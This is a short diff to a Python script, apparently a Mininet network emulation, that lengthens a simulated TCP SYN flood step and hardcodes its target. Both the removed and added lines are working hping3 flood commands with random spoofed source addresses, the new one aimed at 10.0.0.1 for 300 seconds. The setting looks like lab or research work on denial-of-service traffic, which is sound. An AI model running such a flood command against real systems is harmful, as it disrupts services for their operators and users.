@@ -48,8 +48,7 @@ def startNetwork():
     print("--------------------------------------------------------------------------------")
     print("Performing TCP-SYN Flood")  
     print("--------------------------------------------------------------------------------")
-    src.cmd("timeout 20s hping3 -S -V -d 120 -w 64 -p 80 --rand-source --flood {}".format(dst))
-    sleep(100)
+    src.cmd("timeout 300s hping3 -S -V -d 120 -w 64 -p 80 --rand-source --flood 10.0.0.1")
 
     # CLI(net)
     net.stop()
